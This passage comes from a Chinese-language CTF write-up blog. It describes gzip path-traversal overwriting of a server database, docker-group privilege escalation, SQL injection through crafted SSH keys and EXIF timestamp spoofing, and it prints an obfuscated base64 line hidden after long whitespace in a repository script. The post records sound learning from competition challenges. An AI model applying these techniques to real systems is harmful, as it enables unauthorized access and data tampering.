<p>然后开始分析源码。坏消息是，我们还是不知道flag在哪。好消息是，我们发现服务器数据库在哪了，显然题目用了<code>aiosqlite</code>，数据库就在<code>users.db</code>。同时，我们知道了用户注册时会初始化一个个人文件夹<code>files/&lt;random-hash&gt;/</code>，所有文件都会在这里。</p>
<p>下一步就是把数据库拿下来，用DB Browser看一眼，发现这个数据库只有三列：登录名，密码hash，个人文件夹目录。然后gzip解压还有个特性，就是当打包进去的路径包含<code>../../</code>时，解压时也会尊重这个路径，导致解压出来的文件穿越到父级目录去。为此，我们可以伪造一个数据库，放在本地的<code>../../users.db</code>位置，然后打进gzip上传，之后服务器解压时就会覆盖原本的<code>users.db</code>。说实话我也搞不清楚这个路径穿越解压是不是预期的，因为如果能猜到flag位置可以不需要这个，而且这个真的可以用来干扰其他选手比赛。本着公平竞技的原则，我只用insert加了一条，没有删库。好在源码里直接提供了密码hash的SALT，我们可以成功登录，并且把自己的文件目录放在任意位置，相当于可以对任意目录<code>ls</code>。最终我们会发现项目源码位于<code>/chall</code>，而<code>flag</code>就真的只在<code>/chall/flag</code>。所以如果能猜到flag位置就不用爆数据库了，不过说到底，能取证为什么要猜呢？</p>
<p>接下来能不能用这个RCE呢？至少我觉得可以把<code>server.py</code>源码换掉，或者把一些库换掉。考虑到这个可能太过分了我就没弄。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="misc---gitlabrunner-incomplete">misc - gitlabrunner (incomplete)<a href="#misc---gitlabrunner-incomplete" class="hash-link" aria-label="misc - gitlabrunner (incomplete)的直接链接" title="misc - gitlabrunner (incomplete)的直接链接">​</a></h2>
<p>有点意思的题，但是最后没去做。这个题给了一个ssh，进去后是一个ubuntu docker镜像。我们会发现自己是docker组的，并且有外网，那docker组就等于root，我们可以挂载任意目录进docker达成任意文件越权读取。</p>
<p>进去后，稍微进行一些取证(看journalctl)，会发现后台运行着一个gitlab runner。可以拿到配置文件和secret token，似乎每隔十分钟这个runner就会进行一个build任务。如果我们能拦截这个build任务或许可以得到进一步信息，gitlab官方也提到如果泄露token可能可以导致任务克隆攻击。不过这要求我本地也跑一个runner，而且我多少不太喜欢别人代码不知情地运行在自己电脑的感觉，就没去搭环境。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="rev---ssh-incomplete">rev - ssh (incomplete)<a href="#rev---ssh-incomplete" class="hash-link" aria-label="rev - ssh (incomplete)的直接链接" title="rev - ssh (incomplete)的直接链接">​</a></h2>
<p>花了不少精力但是没做出来，我get到IDEA了。这个题想让我们公钥登录一个SSH Server，给了一个<code>authlookup</code>二进制程序。题干里提示我们思考github这种，都是登录git用户，但是不同用 户可以拿到不同权限的机制是怎么实现的。</p>
<p>逆向<code>authlookup</code>，它实现了类似的机制。它会传入一个公钥，然后判断公钥类型，提取公钥参数（比如对RSA公钥，就是N和e），然后放到SQL数据库里查询是否有这样的一条N,e记录，如果有就成功登录。但可惜这个<code>authlookup</code>是可以SQL注入的。</p>
<p>然而这个题难点在于我们不只要bypass公钥认证，还要利用OpenSSH来建立稳定连接。SSH提供的参数是私钥，私钥是包含公钥内容的。因此合理的设想是构造一个原始的私钥-公钥对，但把公钥部分都篡改成SQL注入内容，让服务器直接返回原本的公钥。思路非常合理，但是我无论如何都调试不通过，而且很难判断问题出在哪里。已知的一些问题包括，公钥N得超过1024位否则会因为不安全报错，除此以外可能还有别的各种验证（比如p和q的验证等等）。为此我还研究了下SSH私钥格式，了解了OpenSSH和OpenSSL用的RSA公钥其实格式还不一样，但实际上用pycrypto可以直接生成私钥，更方便一点。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="geekctf-2024">GeekCTF 2024<a href="#geekctf-2024" class="hash-link" aria-label="GeekCTF 2024的直接链接" title="GeekCTF 2024的直接链接">​</a></h2>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="misc---boys-bullet">misc - Boy&#x27;s Bullet<a href="#misc---boys-bullet" class="hash-link" aria-label="misc - Boy&#x27;s Bullet的直接链接" title="misc - Boy&#x27;s Bullet的直接链接">​</a></h2>
<blockquote>
<p>It was the spring of 2024 when a boy born in millennium picked up a real gun on the road. Because he was young, ignorant and fearless, he pulled the trigger. No one died and no one was injured. He thought he had fired a blank shot. Fourteen years later, he heard a faint sound of wind behind him while walking on the road. He stopped and turned around. The bullet hit him between the eyebrows.</p>
<p>curl <a href="http://chall.geekctf.geekcon.top:10038" target="_blank" rel="noopener noreferrer">http://chall.geekctf.geekcon.top:10038</a></p>
</blockquote>
<p>一开始还没意识到，2024+14=2038，所以我以为这个是想说32位Unix系统溢出问题，但其实还不是。</p>
<p>这个题给环境的方式很特别，给的是curl，当然连上之后它会陆续让我们用<code>-T</code>参数传文件，传的文件必须是<code>jpeg</code>文件（jpg扩展名还不行），然后会告诉我们文件的时间戳是多少年而不是2038年。</p>
<p>于是我首先想到的是改文件修改时间和创建时间（创建时间无法在WSL下改，我在Windows下用win32api改的），但没用，文件还是记录了我的真实时间。</p>
<p>其实这时我就该想到不对了，因为unix时间戳按说是不会出现在网络文件传输中的，所以这要么是在请求头里，要么是在文件内部（特别因为本题指定jpeg格式，在文件内部可能性很高）</p>
<p>如果看请求头，curl可以直接带verbose参数，会看到<code>-T</code>上传文件是用<code>PUT</code>，但好像也没什么特别的东西。然后我在上传文件时，把一个png图片扩展名改成<code>jpeg</code>上传了，结果服务器返回了报错信息。信息本身是flask debug模式，内嵌了很多HTML，不过我们还是能找到泄露的源码。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token decorator annotation punctuation" style="color:#393A34">@app</span><span class="token decorator annotation punctuation" style="color:#393A34">.</span><span class="token decorator annotation punctuation" style="color:#393A34">route</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;/&lt;filename&gt;&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> methods</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;PUT&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">upload</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> filename</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">endswith</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;jpeg&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Photo must be in JPEG format\n&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    image </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Image</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">request</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># fetch timestamp from exif data</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exif_time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> datetime</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fromisoformat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">image</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;datetime&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;:&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;-&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exif_timestamp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> c_int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">exif_time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">timestamp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># fetch current timestamp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>稍微调研一下，我们定位到时间是来自<code>exif</code>这 个包，并且访问的是<code>datetime</code>这个属性。我们直接读出原始JPEG数据后，用<code>exif</code>修改这个属性再上传，就可以拿到flag。</p>
<blockquote>
<p><code>flag{47_7h15_m0m3n7_3duc4710n_h45_c0mp1373d_4_72u1y_c1053d_100p}</code></p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="misc---f-and-r">misc - f and r<a href="#misc---f-and-r" class="hash-link" aria-label="misc - f and r的直接链接" title="misc - f and r的直接链接">​</a></h2>
<p>这个题给了一个Windows KB更新安装包（<code>windows10.0-kb114514-x64.msu</code>），第一次玩安装包，了解了不少知识。</p>
<p>首先根据<a href="https://support.microsoft.com/en-us/topic/description-of-the-windows-update-standalone-installer-in-windows-799ba3df-ec7e-b05e-ee13-1cdae8f23b19" target="_blank" rel="noopener noreferrer">微软官方教程</a>，用<code>expand -f:*</code>命令把<code>msu</code>解包，其中<code>.cab</code>文件还可以继续解包。直到最后在<code>Cab_for_KB114514_PSFX.cab</code>中解包出了<code>amd64_curl_0o0o0o0o0o0o0o0_10.0.19041.9999_none_0o0o0o0o0o0o0o0</code>这个文件夹，里面包含<code>f/curl.exe</code>和<code>r/curl.exe</code>，看来这是我们要的东西。不过这两个exe都是二进制乱码。</p>
<p>接下来调研Windows更新机制，我们很快就知道这些是<a href="https://learn.microsoft.com/en-us/windows/deployment/update/psfxwhitepaper" target="_blank" rel="noopener noreferrer">PSFX差分更新</a>，r文件可以还原到上一个版本，f文件则是更新到下个版本，只记录发生变化的部分。同时我还找到了<a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html" target="_blank" rel="noopener noreferrer">wumb0的writeup</a>，非常详细讲解了差分更新的原理，还附带了转换代码（说实话我自己去调研API还真不一定能写出这个来）</p>
<p>有现成工具就简单了。首先我们要拿一个原始的<code>C:\Windows\System32\curl.exe</code>文件。注意到解包过程中一些说明文件提到这个patch是<code>Windows 10 10.0.19041.1613</code>的，我也找了一台运行了很久的Win10机器，拿到了<code>curl.exe</code>。但同时，因为这个是22H2更新过的，我们最好还原到以前的版本，于是我在<code>C:\Windows\WinSxS</code>目录下搜索<code>curl</code>，找到</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\WinSxS\amd64_curl_31bf3856ad364e35_10.0.19041.3693_none_f3098ce6d279979c\curl.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\WinSxS\amd64_curl_31bf3856ad364e35_10.0.19041.3693_none_f3098ce6d279979c\f\curl.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\WinSxS\amd64_curl_31bf3856ad364e35_10.0.19041.3693_none_f3098ce6d279979c\r\curl.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这三个文件，既然这是唯一的更新那我们就用wumb0的代码把这里的r补丁打上，然后再打上题目给的f补丁。把打好补丁的程序放进ghidra逆向，在  字符串区域我们首先就发现原本是curl版本的部分变成了flag。静态分析可能也行，不过我直接<code>.\curl.exe --version</code>出flag了。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="misc---real-or-not-1">misc - real or not 1<a href="#misc---real-or-not-1" class="hash-link" aria-label="misc - real or not 1的直接链接" title="misc - real or not 1的直接链接">​</a></h2>
<p>这个题首先会过一个PoW，爆破hash。然后会一次性给出20张图片的base64，让我们判断这些图片的文件名末尾是<code>Y</code>还是<code>N</code>，需要一次性给出所有答案。因为文件名信息完全丢失，这个题相当无厘头。好在第一问是会告诉你是在第n轮出错的，那么前n-1轮都是对的，第n轮是错的。我们只要弄个字典+pickle记录每次的结果（可以把图片的hash作为key），多试几次，总能爆出来的。另外我发现环境关了再开YN结果可能会不一致，最好一次性做完。</p>
<p><code>flag{DeepFake_1s_Ea5y_aNd_1ntere5t1ng!}</code></p>
<p>其他思路，首先是图片本身可能有问题（我拿到flag1后更觉得这个可能，但是pngcheck和file都看不出问题）。其次，PoW生成使用的<code>random.choices(string.ascii_letters + string.digits, k=16)</code>，说不定可以根据这个爆出种子（实际上每个choice都是一次<code>random()</code>，而一次<code>random()</code>对应两次<code>randint32</code>，不过因为结果是浮点数，显然得不到内部状态。而且就算能预测随机数，我们也不知道后面filename那里的choice怎么对应）</p>
<p>这个题后面给了个补丁，第二问修过之后，PoW时间延长，也不能根据轮次泄露正确答案了，不会做。但做出来人很多，看来有我不知道的东西。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="misc---whereismyflag">misc - whereismyflag<a href="#misc---whereismyflag" class="hash-link" aria-label="misc - whereismyflag的直接链接" title="misc - whereismyflag的直接链接">​</a></h2>
<p>仅次于签到的简单题，但其实这题基本是<a href="https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob21-gzip" target="_blank" rel="noopener noreferrer">GeekGame3未来磁盘</a>的弱化版。</p>
<p>题目给了一个github仓库。clone下来后，发现没有历史记录，但<code>schedule-ics-exporter.py</code>的最后一行好像特别长啊：</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;[+] Done! ICS file successfully generated.&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     </span><span class="token punctuation" style="color:#393A34">;</span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> gzip</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> base64</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> gzip</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decompress</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA==&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># remove spaces:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> gzip</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> base64</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> gzip</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decompress</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA==&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>看起来用gzip解压了一个东西。我们保存为<code>.tar.gz</code>手动解压，发现里面还有个<code>tar.gz</code>。但再解压之前得小心了，因为第二轮的<code>tar.gz</code>有2M的大小，而它解压后的内容更是有1GB。看来这是个压缩炸弹。</p>
<p>如此离谱的解压率，那肯定是因为原始文件中全是重复串，这样的文件在zlib压缩下会产生循环节。经过一些测试（主要还是010editor搜索功能），会发现循环节是<code>0x8031</code>。我们可以打印每个循环节的hash</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cyclic </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xc054</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4023</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x4030</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">secret_gz</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> cyclic</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    seg </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> secret_gz</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">i</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">cyclic</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    seg_hash </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> md5</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">seg</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hexdigest</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> seg_hash</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># output</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x4030</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xc061</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x14092</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1c0c3</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x240f4</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x2c125</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x34156</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x3c187</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x441b8</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x4c1e9</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x5421a</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x5c24b</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x6427c</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x6c2ad</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x742de</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x7c30f</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x84340</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x8c371</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x943a2</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x9c3d3</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xa4404</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xac435</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xb4466</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xbc497</span><span class="token 